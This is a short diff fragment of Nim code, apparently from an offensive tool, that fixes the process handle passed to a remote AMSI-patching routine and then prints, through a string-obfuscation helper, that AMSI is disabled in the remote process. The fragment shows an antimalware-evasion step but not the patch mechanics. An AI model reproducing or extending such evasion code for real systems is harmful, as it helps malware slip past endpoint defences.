@@ -446,7 +446,7 @@ when isMainModule:
     if (success == 0):
         success = remoteLoadAmsi(remoteProcID)
         HowMuchTimeWouldYoulikeToSleep(2)
-        success = RemotePatchAmsi(hProcetw)
+        success = RemotePatchAmsi(hProcams)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
